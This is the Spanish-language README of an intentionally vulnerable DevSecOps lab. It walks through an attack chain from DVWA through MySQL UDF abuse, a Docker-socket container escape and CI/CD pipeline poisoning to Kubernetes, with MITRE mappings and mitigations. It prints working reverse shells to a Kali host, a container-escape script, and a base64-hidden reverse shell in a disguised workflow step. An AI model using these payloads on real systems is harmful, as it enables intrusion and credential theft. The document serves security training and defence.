# DevSecOps Vulnerable Lab: End-to-End Attack Chain & Mitigation Analysis

> Una cadena de ataque completa, no un laboratorio aislado: desde una inyección SQL en una aplicación web hasta el control total de la infraestructura cloud.

![Status](https://img.shields.io/badge/status-active-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK%20mapped-red)

## Propósito

Este laboratorio despliega un entorno intencionadamente vulnerable en **las cinco capas de una infraestructura moderna** (aplicación, host, orquestación, CI/CD e IaC), no para simular un fallo puntual, sino para demostrar cómo una serie de decisiones de configuración "razonables por separado" —un puerto abierto aquí, un rol demasiado permisivo allá— se encadenan hasta convertirse en un compromiso total.

El objetivo no es "hackear DVWA". DVWA es simplemente la puerta de entrada. El objetivo final es escalar, capa a capa, hasta obtener control sobre la infraestructura como código que define todo el entorno cloud.

**Stack técnico:** AWS/LocalStack · Terraform · Ansible · Kubernetes (K3s) · Gitea + Act-Runner · DVWA / MySQL

## La cadena de ataque

DVWA (SQLi) → MySQL → Host → Kubernetes → CI/CD (Gitea) → IaC / Cloud


| Capa | Componente | Rol en la cadena |
|---|---|---|
| 1 | DVWA | Punto de entrada — compromiso de aplicación web |
| 2 | MySQL | Pivote — extracción de credenciales, acceso a base de datos |
| 3 | Host | Escalada — acceso al sistema operativo subyacente |
| 4 | Kubernetes (K3s) | Persistencia — movimiento lateral en el clúster |
| 5 | CI/CD (Gitea) | Secuestro — inyección en pipelines, robo de secretos |
| 6 | IaC / Terraform | Objetivo final — control total de la infraestructura cloud |



## Arquitectura e Infraestructura

<details>
<summary><strong>Ver arquitectura, configuración y vulnerabilidades por capa</strong></summary>

### Mapa de infraestructura

*(Imagen: diagrama de VPC, subnet pública, Security Group, instancia EC2, roles IAM y su relación — sin código, solo el mapa mental)*

La infraestructura vulnerable despliega una VPC con una única subnet pública, una instancia EC2 expuesta directamente a internet, un Security Group sin restricciones de origen, un bucket S3 sin bloqueo de acceso público, y roles/usuarios IAM sobreprivilegiados. A nivel de host, el firewall está desactivado y el socket de Docker es de escritura para cualquier usuario. En Kubernetes, el runner de CI/CD corre en modo privilegiado con el socket de Docker del host montado directamente.

Ninguna de estas piezas es grave de forma aislada. Juntas, forman una ruta directa desde una app web pública hasta control total del proveedor cloud.

### Estructura del repositorio

.
├── 01-cloud-iac
│ ├── hardened/ # Misma infraestructura, versión endurecida
│ └── vulnerable/ # ec2.tf · iam.tf · network.tf · provider.tf · s3.tf
├── 02-provisioning
│ ├── site_hardened.yml
│ └── site_vulnerable.yml
├── 03-k8s-cluster
│ ├── act-runner.yaml
│ └── gitea-deployment.yaml
└── 04-cicd-pipeline
└── devsecops-demo/
├── .gitea/workflows/ # Pipelines CI/CD
├── k8s/vulnerable/ # DVWA + MySQL
└── src/vulnerable/ # Código fuente DVWA


> El repo mantiene **ambas versiones en paralelo** (`hardened/` y `vulnerable/`) para cada capa de IaC y provisioning: no solo se documenta cómo romperlo, sino cómo se arregla.

### Resumen de vulnerabilidades por control de seguridad roto

| Control roto | Fichero | Vulnerabilidad | Severidad | Explotado en → |
|---|---|---|---|---|
| **Control de identidad (IAM)** | `iam.tf` | Trust policy con `Principal = "*"` — cualquiera puede asumir el rol | Crítica | Sección IaC |
| **Control de identidad (IAM)** | `iam.tf` | `iam:PassRole` sin restricción de `Resource` — permite escalada de privilegios | Crítica | Sección IaC |
| **Control de identidad (IAM)** | `iam.tf` | Usuario IAM con `AdministratorAccess` adjunto directamente | Crítica | Sección IaC |
| **Control de acceso a red** | `network.tf` | Security Group: SSH (22) abierto a `0.0.0.0/0` | Alta | Sección Host |
| **Control de acceso a red** | `network.tf` | Security Group: API de Docker sin cifrar (2375) abierta a `0.0.0.0/0` | Crítica | Sección Host |
| **Control de acceso a red** | `network.tf` | Egress sin restricción — facilita exfiltración | Alta | Sección IaC |
| **Control de exposición de datos** | `s3.tf` | Bloqueo de acceso público desactivado (`block_public_acls`, etc.) | Alta | Sección IaC |
| **Control de exposición de datos** | `s3.tf` | Bucket policy con `Principal = "*"` y `PutObject`/`GetObject` públicos | Crítica | Sección IaC |
| **Control de aislamiento (host)** | `site_vulnerable.yml` | UFW (firewall del sistema) desactivado | Alta | Sección Host |
| **Control de aislamiento (host)** | `site_vulnerable.yml` | Socket de Docker en `/var/run/docker.sock` con permisos `0777` | Crítica | Sección Host / K8s |
| **Control de aislamiento (contenedores)** | `act-runner.yaml` | Contenedor `runner` en modo `privileged: true` | Crítica | Sección CI/CD |
| **Control de aislamiento (contenedores)** | `act-runner.yaml` | Socket de Docker del host montado dentro del pod (`hostPath`) | Crítica | Sección CI/CD |
| **Gestión de secretos** | `gitea-deployment.yaml` | `SECRET_KEY`, `INTERNAL_TOKEN` y `JWT_SECRET` hardcodeados en el ConfigMap | Alta | Sección CI/CD |

> **Nota de análisis:** el SG abierto a `0.0.0.0/0` en el puerto 2375 no es explotable *per se* — depende de que la Docker API esté efectivamente escuchando sin autenticación detrás. Es una vulnerabilidad de **impacto condicional**: amplifica el daño de otro hallazgo (el socket 0777) en lugar de ser una puerta de entrada por sí misma. Este matiz es el que separa un hallazgo de checklist de un análisis de riesgo real.

---

### Detalle técnico por capa

<details>
<summary><strong>01 · Cloud / IaC (Terraform)</strong></summary>

**`iam.tf`**
```hcl
# VULNERABILIDAD: Rol con Trust Policy permitiendo asumir el rol a cualquier origen (*)
resource "aws_iam_role" "overprivileged_role" {
  assume_role_policy = jsonencode({
    Statement = [{ Action = "sts:AssumeRole", Effect = "Allow", Principal = "*" }]
  })
}

# VULNERABILIDAD: iam:PassRole sin restricciones en Resource (permite escalada de privilegios)
resource "aws_iam_policy" "passrole_unrestricted" {
  policy = jsonencode({
    Statement = [{ Effect = "Allow", Action = "iam:PassRole", Resource = "*" }]
  })
}

# VULNERABILIDAD: Usuario IAM con AdministratorAccess adjunta directamente
resource "aws_iam_user_policy_attachment" "user_admin_attach" {
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}
```

**`network.tf`**
```hcl
# VULNERABILIDAD: Security Group con exposición total de puertos críticos y egress ilimitado
resource "aws_security_group" "vulnerable_sg" {
  ingress { from_port = 22,   to_port = 22,   cidr_blocks = ["0.0.0.0/0"] }
  ingress { from_port = 2375, to_port = 2375, cidr_blocks = ["0.0.0.0/0"] } # Docker API sin cifrar
  egress  { from_port = 0,    to_port = 0,    protocol = "-1", cidr_blocks = ["0.0.0.0/0"] }
}
```

**`s3.tf`**
```hcl
# VULNERABILIDAD: Deshabilitar el bloqueo de acceso público
resource "aws_s3_bucket_public_access_block" "public_access" {
  block_public_acls   = false
  block_public_policy = false
}

# VULNERABILIDAD: Bucket policy que permite lecturas y subidas públicas
resource "aws_s3_bucket_policy" "allow_public_access" {
  policy = jsonencode({
    Statement = [{ Effect = "Allow", Principal = "*", Action = ["s3:GetObject","s3:PutObject","s3:ListBucket"] }]
  })
}
```

*(Contraste: en `01-cloud-iac/hardened/` los mismos recursos existen con `Principal` restringido a ARNs concretos, bloqueo de acceso público activo y sin puertos administrativos expuestos a `0.0.0.0/0`.)*

</details>

<details>
<summary><strong>02 · Provisioning (Ansible)</strong></summary>

**`site_vulnerable.yml`**
```yaml
# VULNERABILIDAD - Desactivar Firewall del sistema (UFW)
- name: VULNERABILIDAD - Desactivar Firewall del sistema (UFW)
  ufw:
    state: disabled

# VULNERABILIDAD - Socket de Docker expuesto a todos los usuarios (0777)
- name: VULNERABILIDAD - Socket de Docker expuesto a todos los usuarios (0777)
  file:
    path: /var/run/docker.sock
    mode: '0777'
```

Este es el punto bisagra entre "acceso al host" y "control del daemon Docker": cualquier usuario local puede ahora hablar con Docker como si fuera root.

</details>

<details>
<summary><strong>03 · Kubernetes (K3s)</strong></summary>

**`act-runner.yaml`**
```yaml
container:
  privileged: true   # VULNERABILIDAD: runner corre en modo privilegiado
```
```yaml
volumeMounts:
  - name: docker-socket
    mountPath: /var/run/docker.sock   # VULNERABILIDAD: socket del host montado en el pod
volumes:
  - name: docker-socket
    hostPath:
      path: /var/run/docker.sock
```

**`gitea-deployment.yaml`**
```ini
# VULNERABILIDAD: secretos hardcodeados en texto plano dentro del ConfigMap
SECRET_KEY = secretkeylabdevsecops
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.secretkeylabdevsecops
JWT_SECRET = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.jwtsecretlabdevsecops
```

Un pod con `privileged: true` y el socket de Docker del host montado no necesita "escapar" del contenedor — ya tiene control del daemon que gestiona todos los contenedores del nodo, incluido él mismo.

</details>

</details>

## Explotación: De DVWA al Control Total de la Infraestructura Cloud

<details>
<summary><strong>Ver cadena de explotación completa (kill chain end-to-end)</strong></summary>

> ⚠️ **Aviso legal y ético**
> Este laboratorio se ejecuta exclusivamente en un entorno aislado y controlado (red local + LocalStack), sin conexión a sistemas de producción ni de terceros. Todas las técnicas aquí documentadas se aplican únicamente sobre infraestructura propia desplegada para fines educativos y de portfolio profesional. Reproducir estas técnicas contra sistemas sin autorización explícita es ilegal.

**Prerequisitos técnicos para seguir esta sección:**
- Conocimientos básicos de SQL, PHP, Bash/Python y manifiestos YAML de Kubernetes.
- Familiaridad con conceptos de contenedores (Docker), orquestación (K8s) e IaC (Terraform).
- El entorno del laboratorio desplegado según la sección de Arquitectura (punto 2), con conectividad entre Kali (`192.168.252.20`) y el clúster (`192.168.252.10`).

### La cadena de ataque completa

[1] DVWA [2] MySQL [3] Host [4] Kubernetes [5] CI/CD [6] IaC/Cloud
──────────── ──────────── ──────────── ──────────── ──────────── ────────────
File Upload/LFI ──▶ config.inc.php ──▶ docker.sock (0777) ──▶ kubeconfig root ──▶ runner secrets ──▶ IAM PassRole
RCE inicial credenciales + Binds API REST + malicious pod + PPE inyección AssumeRole *
en texto plano ──────────────▶ ──────────────▶ ──────────────▶ Control total
root en el host cluster-admin kubeconfig/AWS AWS/LocalStack


| Capa | Técnica principal | Condición que lo hace posible | Objetivo conseguido |
|---|---|---|---|
| 1 · DVWA | File Upload + Local File Inclusion → reverse shell | Validación de extensión insuficiente en el módulo de subida | Ejecución de código como `www-data` |
| 2 · MySQL | UDF Abuse (`sys_eval`) → RCE en MySQL | Credenciales de `app` en `config.inc.php` + privilegios `FILE` en MySQL | Ejecución de código como `mysql` (uid 999) |
| 3 · Host | Escape de contenedor vía Docker Engine API (Unix socket) | `docker.sock` montado en el pod de MySQL con permisos `0777` y `privileged: true` | Shell root en el nodo host |
| 4 · Kubernetes | Pod malicioso + `nsenter` al namespace PID 1 | `kubeconfig` de `cluster-admin` accesible desde el host (`/etc/rancher/k3s/k3s.yaml`) | Control total del clúster K3s |
| 5 · CI/CD | Pipeline Poisoning (PPE) en workflow de Gitea Actions | Secretos de Gitea/Act-Runner en texto plano, accesibles desde el host o el clúster | Ejecución de código en el runner + exfiltración de secretos |
| 6 · IaC / Cloud | Abuso de `iam:PassRole` sin restricción + `AssumeRole` con `Principal: *` | Credenciales AWS obtenidas del runner o del host, roles IAM sobreprivilegiados desplegados por Terraform | Control administrativo total sobre la infraestructura cloud |

**Nota sobre el orden de explotación:** esta cadena se recorre en el orden en que un atacante real la descubriría — empezando por la superficie expuesta a internet (la aplicación web) y terminando en la infraestructura que la sostiene (IaC/Cloud) — y **no** en el orden en que las capas aparecen en el stack tecnológico o en la sección de Arquitectura. Un atacante nunca tiene acceso directo al Terraform; llega a él atravesando todo lo que hay delante. Que esta narrativa respete ese orden es deliberado: refleja la perspectiva del atacante, no la del administrador que diseñó el sistema de arriba hacia abajo.

---

### `[→] DVWA → [ ] MySQL → [ ] Host → [ ] CI/CD → [ ] K8s → [ ] IaC`

<details>
<summary><strong>1 · Acceso Inicial — DVWA</strong></summary>

Internet ──▶ DVWA (app web pública)
│
├── SQLi ─────────────▶ evaluada, descartada como vector principal
├── Command Injection ─▶ evaluada, descartada como vector principal
└── File Upload + LFI ─▶ ELEGIDA → reverse shell interactiva
│
▼
Enumeración interna (www-data)
sin capabilities, sin docker.sock,
sin permisos útiles en K8s API
│
▼
Descubrimiento de config.inc.php
(credenciales de MySQL en texto plano)


**Por qué esta vía y no otra.** DVWA expone tres vectores explotables de forma directa: SQLi, Command Injection y File Upload/File Inclusion. Se evaluaron los tres, pero se priorizó File Upload + LFI porque da acceso a una **shell interactiva completa** (ejecución arbitraria de PHP en el servidor), mientras que la SQLi habría quedado limitada a extracción de datos vía la propia base de datos, sin ejecución de comandos directa. Para el objetivo de este laboratorio —pivotar entre capas— una shell da mucho más control que una inyección ciega.

**Comprobaciones fallidas (metodología de enumeración real).** Antes de decidir por dónde pivotar, se comprobó sistemáticamente si el propio contenedor de DVWA permitía escalar o escapar directamente, sin éxito en ningún caso:

```bash
whoami                              # → www-data
id                                  # → uid=33(www-data) gid=33(www-data) groups=33(www-data)
sudo -l                             # → bash: sudo: command not found
getcap -r / 2>/dev/null             # → (sin output: no hay binarios con capabilities peligrosas)

cat /proc/self/status | grep Cap
# CapEff: 0000000000000000          → sin capacidades efectivas, sin modo privilegiado

ls -la /var/run/docker.sock
# → No such file or directory        → sin acceso al socket de Docker

cat /proc/mounts
# → overlayfs estándar, solo montajes estándar de K8s (hostname, hosts, resolv.conf, serviceaccount)
#   → sin bind mounts sensibles del host

ls -la /var/run/secrets/kubernetes.io/serviceaccount/
# → token, ca.crt, namespace presentes, pero:
# localsubjectrulesreviews → 403 Forbidden
#   → el ServiceAccount system:serviceaccount:vulnerable-apps:default no tiene permisos útiles

env
# → solo variables de Apache, sin credenciales inyectadas (MYSQL_ROOT_PASSWORD, etc.)
```

> **Conclusión de esta fase:** el contenedor de DVWA está correctamente aislado — sin capabilities, sin `docker.sock`, sin mounts del host, sin privilegios en la API de K8s, corriendo como `www-data` sin `sudo`. **El punto débil de la cadena no está aquí.** Documentar esto no es relleno: demuestra que la enumeración fue sistemática y que el siguiente pivote se justificó, no se asumió.

**Reconocimiento interno desde la reverse shell.** Sin herramientas convencionales de escaneo disponibles en el contenedor, el descubrimiento de vecinos en la red de pods se hizo íntegramente en PHP:

```php
php -r '
$ports = [22, 80, 443, 3306, 5432, 6379, 27017, 8080, 8443];
for ($i = 1; $i <= 254; $i++) {
    $ip = "10.42.0." . $i;  // rango de Pod IPs
    foreach ($ports as $port) {
        $fp = @fsockopen($ip, $port, $errno, $errstr, 0.2);
        if ($fp) { echo "$ip:$port ABIERTO\n"; fclose($fp); }
    }
}
'
```

Pero el hallazgo decisivo no vino del escaneo de red, sino de un fichero de configuración expuesto en el propio filesystem de la aplicación:

```bash
cat /var/www/html/config/config.inc.php
```
```ini
$_DVWA[ 'db_server' ]   = 'mysql-service'
$_DVWA[ 'db_user' ]     = 'app'
$_DVWA[ 'db_password' ] = 'vulnerables'
```

Los ficheros `.bak` y `.dist` presentes en el mismo directorio exponían la misma información, reforzando el hallazgo. Verificación de conectividad y credenciales, de nuevo solo con PHP (sin `nc` ni `curl`):

```php
php -r 'echo gethostbyname("mysql-service");'
// → 10.43.23.99

php -r '$fp = @fsockopen("mysql-service", 3306, $errno, $errstr, 2); if ($fp) { echo "Puerto abierto\n"; }'
// → Puerto abierto

php -r '$conn = new mysqli("mysql-service", "app", "vulnerables"); echo $conn->connect_error ? "AUTH FAIL" : "AUTH OK";'
// → AUTH OK

php -r '$conn = new mysqli("mysql-service", "app", "vulnerables"); $res = $conn->query("SHOW GRANTS;"); while($row = $res->fetch_row()) echo $row[0]."\n";'
// → GRANT ALL PRIVILEGES ON `dvwa`.* TO 'app'@'%'
```

**El insight de esta capa:** la pieza crítica para el pivote no fue ningún exploit sofisticado — fue un fichero de configuración de aplicación, accesible en texto plano desde la propia reverse shell. En la mayoría de entornos reales, la superficie de ataque más peligrosa no son las vulnerabilidades de código, son los secretos mal gestionados en ficheros de configuración.

#### Ficha de Riesgo — DVWA

| Táctica (MITRE ATT&CK) | Técnica | ID | Mitigación |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | WAF, validación estricta de extensión y contenido de ficheros subidos |
| Execution | Command and Scripting Interpreter: PHP | T1059 | Deshabilitar ejecución de scripts en directorios de upload |
| Discovery | Network Service Discovery | T1046 | Segmentación de red (NetworkPolicy) entre namespaces de pods |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 | Gestión de secretos vía Vault/Secrets Manager, nunca en ficheros de app |

> **Con acceso a las credenciales de MySQL, el siguiente objetivo es usarlas para obtener ejecución de código en la base de datos y, desde ahí, buscar la salida del contenedor.**

</details>

### `[✓] DVWA → [→] MySQL → [ ] Host → [ ] CI/CD → [ ] K8s → [ ] IaC`

<details>
<summary><strong>2 · Pivote a MySQL + Escape al Host</strong></summary>

DVWA (www-data) ──[credenciales app:vulnerables]──▶ MySQL (mysql-service)
│
UDF Abuse (sys_eval)
│
▼
RCE como mysql (uid=999)
│
docker.sock (0777) montado en el pod
│
Docker Engine API (socket Unix)
│
Contenedor efímero con Binds:/ + privileged
│
▼
ROOT en el nodo host real


**Por qué el punto débil está en MySQL y no en DVWA.** El diseño del laboratorio coloca deliberadamente el "eslabón débil" de la cadena en el pod de MySQL, no en DVWA. Verificación del manifiesto en producción:

```bash
kubectl get deployment mysql-deployment -n vulnerable-apps -o yaml
```
```yaml
securityContext:
  capabilities:
    add: [SYS_ADMIN]
  privileged: true
volumeMounts:
- mountPath: /var/run/docker.sock
  name: docker-sock
volumes:
- hostPath:
    path: /var/run/docker.sock
    type: Socket
  name: docker-sock
```

Un servicio de base de datos no necesita nunca acceso al daemon de Docker del host. Esta es la materialización exacta del principio de mínimo privilegio violado — y el coste de esa "comodidad de desarrollo" es la escalada de contenedor a host completo.

**UDF Abuse — por qué no es trivial.** No es "ejecutar un script": requiere privilegios `FILE` en MySQL, conocer la ruta exacta del `plugin_dir`, y que la librería `.so` sea compatible con la arquitectura del sistema. Los tres pasos, ejecutados desde la reverse shell de DVWA como `www-data` (usando las credenciales de `config.inc.php`):

```php
// Paso 1 — Subir la librería UDF a una tabla auxiliar
php -r '
$ctx = stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false]]);
$so = file_get_contents("https://raw.githubusercontent.com/Rapid7/metasploit-framework/master/data/exploits/mysql/lib_mysqludf_sys_64.so", false, $ctx);
$hex = bin2hex($so);
$c = new mysqli("mysql-service", "app", "vulnerables", "dvwa");
$c->query("CREATE TABLE IF NOT EXISTS udf_blob(line LONGBLOB);");
$c->query("DELETE FROM udf_blob;");
echo $c->query("INSERT INTO udf_blob VALUES(UNHEX(\"$hex\"));") ? "UDF EN BD OK\n" : $c->error;
'

// Paso 2 — Volcar la librería al plugin_dir de MySQL
php -r '
$c = new mysqli("mysql-service", "app", "vulnerables", "dvwa");
echo $c->query("SELECT line FROM udf_blob INTO DUMPFILE \"/usr/lib64/mysql/plugin/udf_sys.so\";") ? "ARCHIVO SO ESCRITO\n" : $c->error;
'

// Paso 3 — Registrar sys_eval y confirmar RCE
php -r '
$c = new mysqli("mysql-service", "app", "vulnerables", "dvwa");
$c->query("DROP FUNCTION IF EXISTS sys_eval;");
$c->query("CREATE FUNCTION sys_eval RETURNS STRING SONAME \"udf_sys.so\";");
$res = $c->query("SELECT sys_eval(\"id\") AS cmd;");
$r = $res->fetch_assoc();
echo "RCE EXITOSO: " . $r["cmd"] . "\n";
'
// → RCE EXITOSO: uid=999(mysql) gid=999(mysql) groups=999(mysql)
```

Reverse shell hacia Kali (sin `nc` disponible en el contenedor, usando Python vía `sys_eval`):

```bash
# En Kali:
nc -lvnp 4477
```
```php
// Desde DVWA, invocando sys_eval:
php -r '
$c = new mysqli("mysql-service", "app", "vulnerables", "dvwa");
$cmd = "nohup python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"192.168.252.20\\\",4477));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\" >/dev/null 2>&1 &";
$c->query("SELECT sys_eval(\"" . addslashes($cmd) . "\");");
'
```

**Escape al host vía Docker Engine API sobre socket Unix.** Sin CLI de Docker disponible en el contenedor, la interacción con el daemon se hace hablando la API REST directamente sobre el socket:

```bash
ls -l /var/run/docker.sock
# → srw-rw-rw- 1 root 988 0 Sep 15 15:08 /var/run/docker.sock

python -c '
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/var/run/docker.sock")
s.send(b"GET /version HTTP/1.1\r\nHost: localhost\r\n\r\n")
print(s.recv(4096).decode())
'
# → HTTP/1.1 200 OK (Docker 29.8.0)
```

Script de escape (escrito a fichero para evitar problemas de quoting anidado):

```python
# escape.py
import socket, json, base64

cmd = "chroot /mnt/host /bin/bash -c 'bash -i >& /dev/tcp/192.168.252.20/5555 0>&1'"
b64_payload = base64.b64encode(cmd.encode()).decode()

payload = json.dumps({
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh", "-c", "echo " + b64_payload + " | base64 -d | sh"],
    "HostConfig": {
        "Binds": ["/:/mnt/host"],
        "NetworkMode": "host",
        "Privileged": True
    }
})

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/var/run/docker.sock")
req = ("POST /containers/create?name=escape1 HTTP/1.1\r\nHost: localhost\r\n"
       "Content-Type: application/json\r\nContent-Length: " + str(len(payload)) + "\r\n\r\n" + payload)
s.sendall(req.encode())
print(s.recv(4096).decode().split("\r\n")[0])

s2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s2.connect("/var/run/docker.sock")
s2.sendall(b"POST /containers/escape1/start HTTP/1.1\r\nHost: localhost\r\n\r\n")
print(s2.recv(4096).decode().split("\r\n")[0])
```

<details>
<summary>Por qué el payload es así (decisiones de diseño, no casualidad)</summary>

- **`alpine:latest` en vez de `mysql:5.7`:** la imagen de MySQL no incluye `mount`, `chroot` ni `nsenter` — solo lo estrictamente necesario para correr el servicio. Alpine sí los incluye.
- **`NetworkMode: host`:** sin esto, el contenedor efímero se engancha a la bridge por defecto de Docker (`docker0`, `172.17.0.0/16`). La reverse shell intenta salir hacia `192.168.252.20`, en otra red — el NAT de Docker no la enruta y la conexión muere en silencio. Con `NetworkMode: host` el contenedor comparte la pila de red del host sin NAT.
- **`Binds: ["/:/mnt/host"]` en vez de `mount --bind` manual:** `Binds` lo resuelve el *daemon* antes de arrancar el contenedor. Si en vez de eso se intenta `mount --bind` dentro del propio comando, se producen conflictos (el punto de montaje ya ocupado se sobrescribe con el filesystem de la imagen) y además requiere que la imagen tenga el binario `mount` disponible.
- **Payload en base64:** evita el infierno de quoting anidado (comillas simples dentro de dobles dentro de strings Python) que hace el script frágil.
- **Sin f-strings:** el contenedor de MySQL corre Python 2, donde no existen. Se usa concatenación con `+`.

</details>

```bash
# En Kali:
nc -lvnp 5555

# Ejecutar el escape:
python escape.py
```

> Si la conexión llega al `nc`, la shell obtenida es **root en el host real**, no en un contenedor — el `chroot` al filesystem del host montado vía `Binds` convierte el entorno completo en el del sistema anfitrión.

#### Ficha de Riesgo — MySQL / Escape al Host

| Táctica (MITRE ATT&CK) | Técnica | ID | Mitigación |
|---|---|---|---|
| Execution | Exploitation for Client Execution (UDF Abuse) | T1203 | Restringir `FILE` privilege, deshabilitar `secure_file_priv` fuera de rutas controladas |
| Privilege Escalation / Defense Evasion | Escape to Host | T1611 | Nunca montar `docker.sock` dentro de pods; usar runtimes rootless o gVisor |
| Privilege Escalation | Abuse Elevation Control Mechanism: Container Privileged | T1548 | Prohibir `privileged: true` y `SYS_ADMIN` vía PodSecurity Admission / OPA Gatekeeper |
| Lateral Movement | Remote Services: Container Administration Command | T1021.007 | Autenticación TLS mutua obligatoria en el Docker Engine API |

> **Con acceso root al host, el siguiente objetivo es localizar credenciales y configuración que den el salto a las capas de orquestación (Kubernetes) y automatización (CI/CD).**

</details>

### `[✓] DVWA → [✓] MySQL → [→] Host → [ ] CI/CD → [ ] K8s → [ ] IaC`

<details>
<summary><strong>3 · CI/CD — Gitea / Act-Runner</strong></summary>

ROOT en el host
│
├── /var/lib/gitea-data/app.ini ──────▶ SECRET_KEY, INTERNAL_TOKEN, JWT_SECRET
├── /var/lib/act-runner-data/.runner ─▶ token de registro del runner
│
▼
Pipeline Poisoning (PPE): commit malicioso al workflow .gitea/workflows/*.yaml
│
▼
El Act-Runner ejecuta el job con privileged: true + docker.sock del host montado
│
▼
Código arbitrario ejecutado con los privilegios y secretos del proceso de CI/CD


**Qué son Gitea y Act-Runner en este contexto.** Gitea actúa como servidor Git self-hosted (equivalente ligero a GitHub), y Act-Runner ejecuta los workflows definidos en `.gitea/workflows/` de forma compatible con GitHub Actions. Ambos corren como despliegues en el clúster K3s, con sus datos persistidos vía `hostPath` — lo cual, tras el escape de la subsección anterior, los hace directamente legibles desde el host.

**Qué hay en cada fichero y por qué importa.** Con acceso root al host obtenido en el paso anterior:

```bash
cat /var/lib/gitea-data/app.ini
```
```ini
[security]
SECRET_KEY = secretkeylabdevsecops
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.secretkeylabdevsecops

[oauth2]
JWT_SECRET = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.jwtsecretlabdevsecops
```

`SECRET_KEY` cifra las cookies de sesión de Gitea; `INTERNAL_TOKEN` autentica la comunicación interna entre procesos de Gitea; `JWT_SECRET` firma los tokens OAuth2. Con cualquiera de los tres en texto plano, un atacante puede falsificar sesiones o tokens válidos sin necesitar credenciales de ningún usuario.

Adicionalmente, el manifiesto del runner expone su token de registro directamente en el comando de arranque:

```yaml
command:
  - sh
  - -c
  - |
    act_runner register --config /etc/act_runner/config.yaml \
      --instance http://192.168.252.10:30000 \
      --token y2HtdzweXvxJ4g11FGxcByl8A2DjH1UiU6tpXYGl \
      --name k3s-devsecops-runner --no-interactive
```

**Poisoned Pipeline Execution (PPE).** El concepto no es "modificar un YAML" — es que el runner ejecuta código arbitrario en el mismo contexto en el que corren los jobs legítimos: con acceso al `docker.sock` del host y en modo `privileged: true`. En este laboratorio, un workflow de ejemplo (`01-sast-sca.yaml`) ilustra el vector: un paso aparentemente inofensivo de escaneo de secretos (Gitleaks) ejecuta, antes de la herramienta legítima, una reverse shell ofuscada en base64:

```yaml
- name: Gitleaks Scan
  continue-on-error: true
  run: |
    nohup bash -c "$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1Mi4yMC80NDg4IDA+JjEn | base64 -d)" >/dev/null 2>&1 &
    gitleaks detect --source="."
```

Decodificando el payload:

```bash
echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1Mi4yMC80NDg4IDA+JjEn" | base64 -d
# → bash -c 'bash -i >& /dev/tcp/192.168.252.20/4488 0>&1'
```

El uso de base64 y `continue-on-error: true` no es casualidad: dificulta la detección visual en un diff de PR (una revisión superficial ve "escaneo de secretos", no una reverse shell), y asegura que el job se reporte como exitoso aunque el paso legítimo falle, evitando levantar sospechas en el pipeline.

**Dos vectores de exposición de secretos, no uno.** El laboratorio contempla ambos:
1. **Secretos hardcodeados en el repositorio/ConfigMap** (`SECRET_KEY`, `JWT_SECRET` en `app.ini`, visibles para cualquiera con acceso de lectura al manifiesto o al host).
2. **Secretos inyectados como variables de entorno del runner** en tiempo de ejecución, extraíbles desde dentro de cualquier job que se ejecute en él (`env`, `printenv` dentro del contenedor del runner).

**Por qué esta es la capa más peligrosa en entornos reales.** Un pipeline de CI/CD tiene acceso *legítimo* a todo lo que necesita para desplegar: credenciales de cloud, `kubeconfig`, claves de firma de artefactos. Un atacante que controla el pipeline no necesita explotar nada más — hereda exactamente las mismas capacidades que el propio proceso de despliegue. En la práctica, la seguridad del CI/CD **es** la seguridad de toda la infraestructura que ese CI/CD gestiona.

#### Ficha de Riesgo — CI/CD

| Táctica (MITRE ATT&CK) | Técnica | ID | Mitigación |
|---|---|---|---|
| Execution | Supply Chain Compromise (CI/CD Pipeline) | T1195.002 | Revisión obligatoria de cambios en `.gitea/workflows/` (CODEOWNERS + protected branches) |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 | Externalizar `SECRET_KEY`/`JWT_SECRET` a un gestor de secretos, nunca en el ConfigMap |
| Persistence | Compromise Infrastructure: CI/CD | T1584 | Runners efímeros de un solo uso, sin `privileged` ni `docker.sock` montado |
| Defense Evasion | Obfuscated Files or Information | T1027 | Escaneo estático de workflows (detección de patrones base64 + ejecución) antes de merge |

> **Con los secretos del runner y del host en mano, el siguiente objetivo es usarlos para obtener control directo sobre el orquestador: Kubernetes.**

</details>

### `[✓] DVWA → [✓] MySQL → [✓] Host → [✓] CI/CD → [→] K8s → [ ] IaC`

<details>
<summary><strong>4 · Kubernetes</strong></summary>

kubeconfig (root del host o secretos del runner)
│
▼
kubectl con privilegios de cluster-admin
│
├──▶ Despliegue de pod malicioso (hostPID + hostNetwork + privileged)
│ │
│ ▼
│ nsenter -t 1 -m -u -i -n sh
│ │
│ ▼
│ Acceso root interactivo al namespace del host (PID 1)
│
└──▶ Lectura directa de /var/lib/rancher/k3s/server/db/state.db (Kine/SQLite)
│
▼
Todos los Secrets de K8s, en base64, sin cifrado en reposo


